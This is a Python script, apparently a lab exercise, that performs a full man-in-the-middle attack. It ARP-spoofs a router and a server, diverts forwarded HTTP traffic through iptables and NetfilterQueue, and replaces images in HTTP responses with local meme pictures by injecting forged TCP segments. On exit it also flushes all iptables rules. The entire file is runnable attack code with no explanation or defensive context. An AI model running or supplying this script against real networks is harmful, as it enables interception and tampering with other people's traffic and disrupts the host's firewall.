from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import threading
import time
import os
import random

MIDDLE_MAC = get_if_hwaddr("eth0")

ROUTER_IP = "198.10.0.1"
SERVER_IP = "198.10.0.2"

ROUTER_MAC = getmacbyip(ROUTER_IP)
SERVER_MAC = getmacbyip(SERVER_IP)


def poison(target_ip, target_mac, spoof_ip):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=spoof_ip, hwsrc=MIDDLE_MAC)
    while True:
        sendp(pkt, iface="eth0", verbose=False)
        time.sleep(2)


t1 = threading.Thread(target=poison, args=(ROUTER_IP, ROUTER_MAC, SERVER_IP))
t2 = threading.Thread(target=poison, args=(SERVER_IP, SERVER_MAC, ROUTER_IP))
t1.daemon = True
t2.daemon = True
t1.start()
t2.start()

print("[*] ARP spoofing started")
print(f"    MIDDLE MAC : {MIDDLE_MAC}")
print(f"    ROUTER MAC : {ROUTER_MAC}")
print(f"    SERVER MAC : {SERVER_MAC}")

offsets = {}
hijacked = set()

IMAGE_PATHS = [
    "/elocal/capitolul3/src/wide-putin-walk.jpg",
    "/elocal/capitolul3/src/w44pf30ek27h1.jpeg",
    "what-are-your-favorite-hyrax-pictures-accounts-memes-v0-48brqzi67eud1.webp",
    #"69868667-67-sixty-seven-numeral-imitation-glass-and-a-blazing-fire-isolated-on-white-background.jpg"
]

images = []
for path in IMAGE_PATHS:
    with open(path, "rb") as f:
        images.append(f.read())

def pick_image():
    return random.choice(images)

def process_packet(packet):
    octets = packet.get_payload()
    pkt = IP(octets)

    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        packet.accept()
        return

    if pkt[TCP].sport != 80:
        packet.accept()
        return
#SIX SEVEN
    conn = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
    if conn in hijacked:
        packet.drop()
        return

    payload = pkt[Raw].load
    print("______________________________________________________________________________________________________________________________________-")
    print("______________________________________________________________________________________________________________________________________-")
    print("______________________________________________________________________________________________________________________________________-")
    print(payload[:1000])
    if b"Content-Type: image" not in payload:
        packet.accept()
        return
    replacement_image = pick_image()

    headers, _ = payload.split(b"\r\n\r\n", 1)
    headers = headers.replace(
        b"Content-Length: " + headers.split(b"Content-Length: ")[1].split(b"\r\n")[0],
        b"Content-Length: " + str(len(replacement_image)).encode()
    )

    full_payload = headers + b"\r\n\r\n" + replacement_image
    chunk_size = 1400
    seq = pkt[TCP].seq

    for i in range(0, len(full_payload), chunk_size):
        chunk = full_payload[i:i + chunk_size]
        new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                  TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,seq=seq, ack=pkt[TCP].ack,flags="PA") / \
                  Raw(load=chunk)
        send(new_pkt, verbose=False)
        seq += len(chunk)

    hijacked.add(conn)
    packet.drop()


def start_nfq():
    os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 10")
    os.system("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 10")
    q = NFQ()
    try:
        q.bind(10, process_packet)
        q.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        q.unbind()


t1.join(0)
start_nfq()
